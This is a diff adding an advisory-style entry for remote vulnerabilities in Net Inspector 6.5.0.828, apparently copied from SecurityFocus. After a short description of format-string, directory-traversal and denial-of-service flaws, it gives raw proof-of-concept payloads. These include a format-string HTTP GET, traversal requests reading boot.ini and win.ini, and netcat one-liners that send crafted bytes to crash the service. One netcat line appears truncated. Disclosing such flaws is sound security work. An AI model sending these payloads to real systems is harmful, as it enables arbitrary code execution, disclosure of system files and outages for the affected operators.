@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/28266/info
+
+Net Inspector is prone to multiple remote vulnerabilities, including:
+
+- A format-string vulnerability
+- A directory-traversal vulnerability
+- Multiple denial-of-service vulnerabilities
+
+An attacker can exploit these issues to execute arbitrary code within the context of the affected application, obtain sensitive information, or crash the affected application.
+
+These issues affect Net Inspector 6.5.0.828; other versions may also be affected. 
+
+GET /%n%n%s%s%n%n%n%s HTTP/1.0
+
+GET ../../../../boot.ini HTTP/1.0
+
+GET \../..\../..\windows/win.ini HTTP/1.0
+
+cho|nc SERVER PORT -v -v -u
+
+echo -n -e \x2a\x45\x67\xf2\x00\x00\x00\x00|nc SERVER 5221 -v -v -w 1
+
